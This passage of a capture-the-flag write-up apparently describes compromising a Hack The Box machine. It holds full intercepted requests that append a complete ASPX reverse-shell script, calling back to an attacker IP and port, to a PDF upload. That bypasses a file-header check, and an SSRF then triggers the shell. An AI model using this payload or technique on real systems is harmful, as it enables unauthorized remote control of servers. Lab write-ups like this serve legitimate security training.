+69.2500 664.7040 Td
+( text. Oh, how boring typing this stuff. But not as boring as watching ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 652.7520 Td
+( paint dry. And more text. And more text. And more text. And more text. ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 640.8000 Td
+( Boring.  More, a little more text. The end, and just as well. ) Tj
+ET
+endstream
+endobj
+
+8 0 obj
+[/PDF /Text]
+endobj
+
+9 0 obj
+&lt;&lt;
+/Type /Font
+/Subtype /Type1
+/Name /F1
+/BaseFont /Helvetica
+/Encoding /WinAnsiEncoding
+&gt;&gt;
+endobj
+
+10 0 obj
+&lt;&lt;
+/Creator (Rave \(http://www.nevrona.com/rave\))
+/Producer (Nevrona Designs)
+/CreationDate (D:20060301072826)
+&gt;&gt;
+endobj
+
+xref
+0 11
+0000000000 65535 f
+0000000019 00000 n
+0000000093 00000 n
+0000000147 00000 n
+0000000222 00000 n
+0000000390 00000 n
+0000001522 00000 n
+0000001690 00000 n
+0000002423 00000 n
+0000002456 00000 n
+0000002574 00000 n
+
+trailer
+&lt;&lt;
+/Size 11
+/Root 1 0 R
+/Info 10 0 R
+&gt;&gt;
+
+startxref
+2714
+%%EOF
+
+-----------------------------2852576984571027806530674011
+Content-Disposition: form-data; name="__RequestVerificationToken"
+
+CfDJ8Id1ehANBa5DlaPtFg4-GBsnw3SBdMgtDX67ape_JbfxrYM_3eyWrJWDP_-bYdt-UHOPLzrwAGUEF0EB47cmIucPCELZX9R8VWaTxvr5sUo5xb_8dnpOs0UG0ckOBWa6A89ouq4SwPGmqibtIMLJVUXkEho8A6dMQU3NQpjmTB4hYAB-HEvRiJIUxgLhpSkjig
+-----------------------------2852576984571027806530674011--</code></pre>
+</div>
+</details><details>
+<summary>response</summary>
+<div class="inner">
+<pre><code>HTTP/2 302 Found
+Location: /ExamReport
+Server: Microsoft-IIS/10.0
+Strict-Transport-Security: max-age=2592000
+Set-Cookie: .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8Id1ehANBa5DlaPtFg4-GBt_3ERhX3Rul6xMCV7bAwRePtHDnLYo6vuySKrDRlHYp9TkgM8GERVAZ752VoVJ6-IiT_nTyQZWTMB3r1EoDnAf6hgy1MQ9C_lA4eV-0-YGsENHbYVATOYPDRxxJGtAZuwUYw7Go7uvTj3m8_O5pyIbSWv-gg_xS-pt1yJtEMrbeA; path=/; samesite=lax; httponly
+Date: Tue, 31 Oct 2023 14:08:05 GMT</code></pre>
+</div>
+</details></li><li><span style="border-bottom:0.05em solid">Upload a real pdf file &gt; intercept &gt; change the filename to </span><span style="border-bottom:0.05em solid"><code>oi.aspx</code></span></li><li><span style="border-bottom:0.05em solid">at the end of the PDF file ‘EOF…’ paste aspx payload from github</span><figure><p><a href="https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx" target="_blank" rel="noopener noreferrer">ASPX reverse shell · borjmz/aspx-reverse-shell</a></p></figure><ul><li>change lhost: 10.10.16.6</li><li>change lport: 4444</li></ul></li><li><span style="border-bottom:0.05em solid">start a </span><span style="border-bottom:0.05em solid"><code>nc</code></span><span style="border-bottom:0.05em solid"> listener</span></li><li><span style="border-bottom:0.05em solid">upload</span><details>
+<summary>request</summary>
+<div class="inner">
+<pre><code>POST /ExamReport/Upload HTTP/2
+Host: portal.meddigi.htb
+Cookie: .AspNetCore.Antiforgery.d2PTPu5_rLA=CfDJ8IIp4kvo-UpPhw2Q9l9qsCiCXL71qxxZLyPuf3cAnrAth1VLhgH5Su3Ajne-CDf0LfjbxtQPfiHbdEYu-Y8jjBSV_hCvm1JiKs-9iYhDGvHaN32QJLhCz1_tuTEi2pQ3VNGvIdolbM7UzJ6ZLQbu7z8; access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjciLCJlbWFpbCI6ImRvY3RvckBkb2N0b3IuZG9jdG9yIiwibmJmIjoxNjk4NzY0MDkzLCJleHAiOjE2OTg3Njc2OTMsImlhdCI6MTY5ODc2NDA5MywiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.MPywt8pAjQu_bnF3iQaiIbY84NEIwUPyxkH6UoRiVZ0
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------5132737932860347953370400662
+Content-Length: 20284
+Origin: https://portal.meddigi.htb
+Referer: https://portal.meddigi.htb/examreport
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+-----------------------------5132737932860347953370400662
+Content-Disposition: form-data; name="PatientNo"
+
+123456
+-----------------------------5132737932860347953370400662
+Content-Disposition: form-data; name="PatientName"
+
+hadaj
+-----------------------------5132737932860347953370400662
+Content-Disposition: form-data; name="ExamType"
+
+fjhbzjfb
+-----------------------------5132737932860347953370400662
+Content-Disposition: form-data; name="PhoneNumber"
+
+0123456789
+-----------------------------5132737932860347953370400662
+Content-Disposition: form-data; name="Department"
+
+hjazgfdjha
+-----------------------------5132737932860347953370400662
+Content-Disposition: form-data; name="VisitDate"
+
+0001-01-01
+-----------------------------5132737932860347953370400662
+Content-Disposition: form-data; name="ReportFile"; filename="oi.aspx"
+Content-Type: application/pdf
+
+%PDF-1.3
+%âãÏÓ
+
+1 0 obj
+&lt;&lt;
+/Type /Catalog
+/Outlines 2 0 R
+/Pages 3 0 R
+&gt;&gt;
+endobj
+
+2 0 obj
+&lt;&lt;
+/Type /Outlines
+/Count 0
+&gt;&gt;
+endobj
+
+3 0 obj
+&lt;&lt;
+/Type /Pages
+/Count 2
+/Kids [ 4 0 R 6 0 R ]
+&gt;&gt;
+endobj
+
+4 0 obj
+&lt;&lt;
+/Type /Page
+/Parent 3 0 R
+/Resources &lt;&lt;
+/Font &lt;&lt;
+/F1 9 0 R
+&gt;&gt;
+/ProcSet 8 0 R
+&gt;&gt;
+/MediaBox [0 0 612.0000 792.0000]
+/Contents 5 0 R
+&gt;&gt;
+endobj
+
+5 0 obj
+&lt;&lt; /Length 1074 &gt;&gt;
+stream
+2 J
+BT
+0 0 0 rg
+/F1 0027 Tf
+57.3750 722.2800 Td
+( A Simple PDF File ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 688.6080 Td
+( This is a small demonstration .pdf file - ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 664.7040 Td
+( just for use in the Virtual Mechanics tutorials. More text. And more ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 652.7520 Td
+( text. And more text. And more text. And more text. ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 628.8480 Td
+( And more text. And more text. And more text. And more text. And more ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 616.8960 Td
+( text. And more text. Boring, zzzzz. And more text. And more text. And ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 604.9440 Td
+( more text. And more text. And more text. And more text. And more text. ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 592.9920 Td
+( And more text. And more text. ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 569.0880 Td
+( And more text. And more text. And more text. And more text. And more ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 557.1360 Td
+( text. And more text. And more text. Even more. Continued on page 2 ...) Tj
+ET
+endstream
+endobj
+
+6 0 obj
+&lt;&lt;
+/Type /Page
+/Parent 3 0 R
+/Resources &lt;&lt;
+/Font &lt;&lt;
+/F1 9 0 R
+&gt;&gt;
+/ProcSet 8 0 R
+&gt;&gt;
+/MediaBox [0 0 612.0000 792.0000]
+/Contents 7 0 R
+&gt;&gt;
+endobj
+
+7 0 obj
+&lt;&lt; /Length 676 &gt;&gt;
+stream
+2 J
+BT
+0 0 0 rg
+/F1 0027 Tf
+57.3750 722.2800 Td
+( Simple PDF File 2 ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 688.6080 Td
+( ...continued from page 1. Yet more text. And more text. And more text. ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 676.6560 Td
+( And more text. And more text. And more text. And more text. And more ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 664.7040 Td
+( text. Oh, how boring typing this stuff. But not as boring as watching ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 652.7520 Td
+( paint dry. And more text. And more text. And more text. And more text. ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 640.8000 Td
+( Boring.  More, a little more text. The end, and just as well. ) Tj
+ET
+endstream
+endobj
+
+8 0 obj
+[/PDF /Text]
+endobj
+
+9 0 obj
+&lt;&lt;
+/Type /Font
+/Subtype /Type1
+/Name /F1
+/BaseFont /Helvetica
+/Encoding /WinAnsiEncoding
+&gt;&gt;
+endobj
+
+10 0 obj
+&lt;&lt;
+/Creator (Rave \(http://www.nevrona.com/rave\))
+/Producer (Nevrona Designs)
+/CreationDate (D:20060301072826)
+&gt;&gt;
+endobj
+
+xref
+0 11
+0000000000 65535 f
+0000000019 00000 n
+0000000093 00000 n
+0000000147 00000 n
+0000000222 00000 n
+0000000390 00000 n
+0000001522 00000 n
+0000001690 00000 n
+0000002423 00000 n
+0000002456 00000 n
+0000002574 00000 n
+
+trailer
+&lt;&lt;
+/Size 11
+/Root 1 0 R
+/Info 10 0 R
+&gt;&gt;
+
+startxref
+2714
+%%EOF
+&lt;%@ Page Language="C#" %&gt;
+&lt;%@ Import Namespace="System.Runtime.InteropServices" %&gt;
+&lt;%@ Import Namespace="System.Net" %&gt;
+&lt;%@ Import Namespace="System.Net.Sockets" %&gt;
+&lt;%@ Import Namespace="System.Security.Principal" %&gt;
+&lt;%@ Import Namespace="System.Data.SqlClient" %&gt;
+&lt;script runat="server"&gt;
+//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
+//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
+
+	protected void Page_Load(object sender, EventArgs e)
+    {
+	    String host = "10.10.16.6"; //CHANGE THIS
+            int port = 4444; ////CHANGE THIS
+
+        CallbackShell(host, port);
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct STARTUPINFO
+    {
+        public int cb;
+        public String lpReserved;
+        public String lpDesktop;
+        public String lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttribute;
+        public uint dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public uint dwProcessId;
+        public uint dwThreadId;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SECURITY_ATTRIBUTES
+    {
+        public int Length;
+        public IntPtr lpSecurityDescriptor;
+        public bool bInheritHandle;
+    }
+
+
+    [DllImport("kernel32.dll")]
+    static extern bool CreateProcess(string lpApplicationName,
+       string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
+       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
+       uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
+       [In] ref STARTUPINFO lpStartupInfo,
+       out PROCESS_INFORMATION lpProcessInformation);
+
+    public static uint INFINITE = 0xFFFFFFFF;
+
+    [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
+    internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);
+
+    internal struct sockaddr_in
+    {
+        public short sin_family;
+        public short sin_port;
+        public int sin_addr;
+        public long sin_zero;
+    }
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetStdHandle(int nStdHandle);
+
+    [DllImport("kernel32.dll")]
+    static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);
+
+    public const int STD_INPUT_HANDLE = -10;
+    public const int STD_OUTPUT_HANDLE = -11;
+    public const int STD_ERROR_HANDLE = -12;
+
+    [DllImport("kernel32")]
+    static extern bool AllocConsole();
+
+
+    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
+                                            [In] SocketType socketType,
+                                            [In] ProtocolType protocolType,
+                                            [In] IntPtr protocolInfo,
+                                            [In] uint group,
+                                            [In] int flags
+                                            );
+
+    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    internal static extern int inet_addr([In] string cp);
+    [DllImport("ws2_32.dll")]
+    private static extern string inet_ntoa(uint ip);
+
+    [DllImport("ws2_32.dll")]
+    private static extern uint htonl(uint ip);
+
+    [DllImport("ws2_32.dll")]
+    private static extern uint ntohl(uint ip);
+
+    [DllImport("ws2_32.dll")]
+    private static extern ushort htons(ushort ip);
+
+    [DllImport("ws2_32.dll")]
+    private static extern ushort ntohs(ushort ip);
+
+
+   [DllImport("WS2_32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
+   internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);
+
+    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+   internal static extern int send(
+                                [In] IntPtr socketHandle,
+                                [In] byte[] pinnedBuffer,
+                                [In] int len,
+                                [In] SocketFlags socketFlags
+                                );
+
+    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+   internal static extern int recv(
+                                [In] IntPtr socketHandle,
+                                [In] IntPtr pinnedBuffer,
+                                [In] int len,
+                                [In] SocketFlags socketFlags
+                                );
+
+    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+   internal static extern int closesocket(
+                                       [In] IntPtr socketHandle
+                                       );
+
+    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+   internal static extern IntPtr accept(
+                                  [In] IntPtr socketHandle,
+                                  [In, Out] ref sockaddr_in socketAddress,
+                                  [In, Out] ref int socketAddressSize
+                                  );
+
+    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+   internal static extern int listen(
+                                  [In] IntPtr socketHandle,
+                                  [In] int backlog
+                                  );
+
+    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+   internal static extern int bind(
+                                [In] IntPtr socketHandle,
+                                [In] ref sockaddr_in  socketAddress,
+                                [In] int socketAddressSize
+                                );
+
+
+   public enum TOKEN_INFORMATION_CLASS
+   {
+       TokenUser = 1,
+       TokenGroups,
+       TokenPrivileges,
+       TokenOwner,
+       TokenPrimaryGroup,
+       TokenDefaultDacl,
+       TokenSource,
+       TokenType,
+       TokenImpersonationLevel,
+       TokenStatistics,
+       TokenRestrictedSids,
+       TokenSessionId
+   }
+
+   [DllImport("advapi32", CharSet = CharSet.Auto)]
+   public static extern bool GetTokenInformation(
+       IntPtr hToken,
+       TOKEN_INFORMATION_CLASS tokenInfoClass,
+       IntPtr TokenInformation,
+       int tokeInfoLength,
+       ref int reqLength);
+
+   public enum TOKEN_TYPE
+   {
+       TokenPrimary = 1,
+       TokenImpersonation
+   }
+
+   public enum SECURITY_IMPERSONATION_LEVEL
+   {
+       SecurityAnonymous,
+       SecurityIdentification,
+       SecurityImpersonation,
+       SecurityDelegation
+   }
+
+
+   [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
+   public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
+       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,
+       String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+   [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
+   public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,
+       ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,
+       ref IntPtr DuplicateTokenHandle);
+
+
+
+   const int ERROR_NO_MORE_ITEMS = 259;
+
+   [StructLayout(LayoutKind.Sequential)]
+   struct TOKEN_USER
+   {
+       public _SID_AND_ATTRIBUTES User;
+   }
+
+   [StructLayout(LayoutKind.Sequential)]
+   public struct _SID_AND_ATTRIBUTES
+   {
+       public IntPtr Sid;
+       public int Attributes;
+   }
+
+   [DllImport("advapi32", CharSet = CharSet.Auto)]
+   public extern static bool LookupAccountSid
+   (
+       [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName,
+       IntPtr pSid,
+       StringBuilder Account,
+       ref int cbName,
+       StringBuilder DomainName,
+       ref int cbDomainName,
+       ref int peUse
+
+   );
+
+   [DllImport("advapi32", CharSet = CharSet.Auto)]
+   public extern static bool ConvertSidToStringSid(
+       IntPtr pSID,
+       [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);
+
+
+   [DllImport("kernel32.dll", SetLastError = true)]
+   public static extern bool CloseHandle(
+       IntPtr hHandle);
+
+   [DllImport("kernel32.dll", SetLastError = true)]
+   public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
+   [Flags]
+   public enum ProcessAccessFlags : uint
+   {
+       All = 0x001F0FFF,
+       Terminate = 0x00000001,
+       CreateThread = 0x00000002,
+       VMOperation = 0x00000008,
+       VMRead = 0x00000010,
+       VMWrite = 0x00000020,
+       DupHandle = 0x00000040,
+       SetInformation = 0x00000200,
+       QueryInformation = 0x00000400,
+       Synchronize = 0x00100000
+   }
+
+   [DllImport("kernel32.dll")]
+   static extern IntPtr GetCurrentProcess();
+
+   [DllImport("kernel32.dll")]
+   extern static IntPtr GetCurrentThread();
+
+
+   [DllImport("kernel32.dll", SetLastError = true)]
+   [return: MarshalAs(UnmanagedType.Bool)]
+   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
+      IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,
+      uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
+
+    [DllImport("psapi.dll", SetLastError = true)]
+    public static extern bool EnumProcessModules(IntPtr hProcess,
+    [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule,
+    uint cb,
+    [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);
+
+    [DllImport("psapi.dll")]
+    static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);
+
+    public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;
+    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;
+    public const uint PIPE_ACCESS_INBOUND = 0x00000001;
+    public const uint PIPE_WAIT = 0x00000000;
+    public const uint PIPE_NOWAIT = 0x00000001;
+    public const uint PIPE_READMODE_BYTE = 0x00000000;
+    public const uint PIPE_READMODE_MESSAGE = 0x00000002;
+    public const uint PIPE_TYPE_BYTE = 0x00000000;
+    public const uint PIPE_TYPE_MESSAGE = 0x00000004;
+    public const uint PIPE_CLIENT_END = 0x00000000;
+    public const uint PIPE_SERVER_END = 0x00000001;
+    public const uint PIPE_UNLIMITED_INSTANCES = 255;
+
+    public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;
+    public const uint NMPWAIT_NOWAIT = 0x00000001;
+    public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;
+
+    public const uint GENERIC_READ = (0x80000000);
+    public const uint GENERIC_WRITE = (0x40000000);
+    public const uint GENERIC_EXECUTE = (0x20000000);
+    public const uint GENERIC_ALL = (0x10000000);
+
+    public const uint CREATE_NEW = 1;
+    public const uint CREATE_ALWAYS = 2;
+    public const uint OPEN_EXISTING = 3;
+    public const uint OPEN_ALWAYS = 4;
+    public const uint TRUNCATE_EXISTING = 5;
+
+    public const int INVALID_HANDLE_VALUE = -1;
+
+    public const ulong ERROR_SUCCESS = 0;
+    public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;
+    public const ulong ERROR_PIPE_BUSY = 231;
+    public const ulong ERROR_NO_DATA = 232;
+    public const ulong ERROR_PIPE_NOT_CONNECTED = 233;
+    public const ulong ERROR_MORE_DATA = 234;
+    public const ulong ERROR_PIPE_CONNECTED = 535;
+    public const ulong ERROR_PIPE_LISTENING = 536;
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateNamedPipe(
+        String lpName,
+        uint dwOpenMode,
+        uint dwPipeMode,
+        uint nMaxInstances,
+        uint nOutBufferSize,
+        uint nInBufferSize,
+        uint nDefaultTimeOut,
+        IntPtr pipeSecurityDescriptor
+        );
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool ConnectNamedPipe(
+        IntPtr hHandle,
+        uint lpOverlapped
+        );
+
+    [DllImport("Advapi32.dll", SetLastError = true)]
+    public static extern bool ImpersonateNamedPipeClient(
+        IntPtr hHandle);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool GetNamedPipeHandleState(
+        IntPtr hHandle,
+        IntPtr lpState,
+        IntPtr lpCurInstances,
+        IntPtr lpMaxCollectionCount,
+        IntPtr lpCollectDataTimeout,
+        StringBuilder lpUserName,
+        int nMaxUserNameSize
+        );
+
+    protected void CallbackShell(string server, int port)
+    {
+
+        string request = "Spawn Shell...\n";
+        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);
+
+        IntPtr oursocket = IntPtr.Zero;
+
+        sockaddr_in socketinfo;
+        oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0);
+        socketinfo = new sockaddr_in();
+        socketinfo.sin_family = (short) AddressFamily.InterNetwork;
+        socketinfo.sin_addr = inet_addr(server);
+        socketinfo.sin_port = (short) htons((ushort)port);
+        connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo));
+        send(oursocket, bytesSent, request.Length, 0);
+        SpawnProcessAsPriv(oursocket);
+        closesocket(oursocket);
+    }
+
+    protected void SpawnProcess(IntPtr oursocket)
+    {
+        bool retValue;
+        string Application = Environment.GetEnvironmentVariable("comspec");
+        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
+        STARTUPINFO sInfo = new STARTUPINFO();
+        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
+        pSec.Length = Marshal.SizeOf(pSec);
+        sInfo.dwFlags = 0x00000101;
+        sInfo.hStdInput = oursocket;
+        sInfo.hStdOutput = oursocket;
+        sInfo.hStdError = oursocket;
+        retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
+        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
+    }
+
+    protected void SpawnProcessAsPriv(IntPtr oursocket)
+    {
+        bool retValue;
+        string Application = Environment.GetEnvironmentVariable("comspec");
+        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
+        STARTUPINFO sInfo = new STARTUPINFO();
+        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
+        pSec.Length = Marshal.SizeOf(pSec);
+        sInfo.dwFlags = 0x00000101;
+        IntPtr DupeToken = new IntPtr(0);
+        sInfo.hStdInput = oursocket;
+        sInfo.hStdOutput = oursocket;
+        sInfo.hStdError = oursocket;
+        if (DupeToken == IntPtr.Zero)
+            retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
+        else
+            retValue = CreateProcessAsUser(DupeToken, Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
+        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
+        CloseHandle(DupeToken);
+    }
+    &lt;/script&gt;
+
+
+-----------------------------5132737932860347953370400662
+Content-Disposition: form-data; name="__RequestVerificationToken"
+
+CfDJ8IIp4kvo-UpPhw2Q9l9qsCglle_sKaqoVkDRr_W5Oh7j2Kn2VQLu0xhskKL1shDOXWt0E8XwqWr2DnLmR_rR3R1seyw0m_On0XwFImk5DGwB3HM4MkrhLR1WDL_kZEUfDMfzEfcK-amvA-JgesXoI5tRRCQYIpiJVbGflpUiejeiwvrI3iPv0axglObQLsGL_Q
+-----------------------------5132737932860347953370400662--</code></pre>
+</div>
+</details><details>
+<summary>response</summary>
+<div class="inner">
+<pre><code>HTTP/2 302 Found
+Location: /ExamReport
+Server: Microsoft-IIS/10.0
+Strict-Transport-Security: max-age=2592000
+Set-Cookie: .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8IIp4kvo-UpPhw2Q9l9qsCj9Fy1o2UrTDhWMpf0jOVD8l43_1uAdQEtOu2dwoIx7n6uwMnzr9iVTEicJ7boCbygCAUsc7CngIPvhtTgXcKof-jwjP3Yz5yGBEtZbUIjM0E3dZxkz1H2s8iGe_UqME7z0uOeSR6O1iKbQjlMMdIHgYNHExqLK2t3BLy0MjiNo6g; path=/; samesite=lax; httponly
+Date: Tue, 31 Oct 2023 15:38:47 GMT</code></pre>
+</div>
+</details><ul><li>the check seems to be the file header ‘<code>%PDF-1.3’</code><ul><li>filename can be altered</li><li>it is possible to include another file after <code>%%EOF</code> , meaning the upload is misinterpreted by the server</li></ul></li><li>X-Content-Type-Options isn’t set<aside class="block-color-gray_background callout" data-notion-callout="" data-notion-callout-icon="⚠️" data-notion-callout-background="gray_background" style="white-space:pre-wrap;display:flex" id="4aaf6fb3-9439-4a8f-85d5-ab31eaafdea5" dir="ltr"><div style="font-size:1.5em"><span class="icon" data-emoji="⚠️"></span></div><div style="width:100%">if the server responds with the appropriate <code>X-Content-Type-Options: nosniff</code><br> header, it can potentially help in securing the application by preventing the browser from interpreting the uploaded file as something other than what is specified in the "Content-Type" header. This can be especially useful in cases where file uploads are involved, as it helps reduce the risk of content-type confusion and related security vulnerabilities.</div></aside></li></ul><p>→ A confirmation message is displayed, meaning that we successfully uploaded the file</p></li><li><span style="border-bottom:0.05em solid">Check where the file is uploaded so we can trigger the reverse shell…</span></li></ol>
+
+<h3>4: SSRF (trigger reverse shell)</h3>
+
+<blockquote>To run our payload, we first need to gain access to it. I've identified an SSRF vulnerability that could assist us in achieving this goal.</blockquote>
+
+<pre><code>POST /Prescriptions/SendEmail HTTP/2
+Host: portal.meddigi.htb
+[SNIP]
+Email=oi%40oi.oi&amp;Link=http%3A%2F%2Foi.com</code></pre>
+
+<p>→ Note: the ‘<code>Link</code>’ parameter looks quite interesting</p>
+
+<ol><li><span style="border-bottom:0.05em solid">Send to intruder change the parameter to </span><span style="border-bottom:0.05em solid"><code>http://127.0.0.1:&lt;payload&gt;</code></span><span style="border-bottom:0.05em solid"> and use list of ports</span><figure><img src="../assets/images/htb/appsanity/07-untitled-6.png" alt=""></figure><blockquote>We can see port ‘8080’ has a different length than other payloads</blockquote></li>
+<li><span style="border-bottom:0.05em solid">When entering the URL (http://127.0.0.1:8080) we get an overview of all uploaded files</span><ol><li>When clicking ‘View Report’ on our payload it tries to do another request to access it</li>
+<li>We can modify the parameter so it tries to access our payload directly using SSRF<details>
+<summary>request</summary>
+<div class="inner">
+<pre><code>POST /Prescriptions/SendEmail HTTP/2
+Host: portal.meddigi.htb
+Cookie: .AspNetCore.Antiforgery.d2PTPu5_rLA=CfDJ8IIp4kvo-UpPhw2Q9l9qsCiCXL71qxxZLyPuf3cAnrAth1VLhgH5Su3Ajne-CDf0LfjbxtQPfiHbdEYu-Y8jjBSV_hCvm1JiKs-9iYhDGvHaN32QJLhCz1_tuTEi2pQ3VNGvIdolbM7UzJ6ZLQbu7z8; access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjciLCJlbWFpbCI6ImRvY3RvckBkb2N0b3IuZG9jdG9yIiwibmJmIjoxNjk4NzY0MDkzLCJleHAiOjE2OTg3Njc2OTMsImlhdCI6MTY5ODc2NDA5MywiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.MPywt8pAjQu_bnF3iQaiIbY84NEIwUPyxkH6UoRiVZ0
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://portal.meddigi.htb/Prescriptions
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 123
+Origin: https://portal.meddigi.htb
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+
+Email=oi%40oi.oi&amp;Link=http%3A%2F%2F127.0.0.1%3A8080%2FViewReport.aspx%3Ffile%3Debef503c-a2d6-4d28-b614-284026439952_oi.aspx</code></pre>
+</div>
+</details></li></ol></li>
+<li><span style="border-bottom:0.05em solid">We get a callback as user </span><span style="border-bottom:0.05em solid"><code>appsanity\svc_exampanel</code></span><span style="border-bottom:0.05em solid">! 🙂</span></li></ol>
+
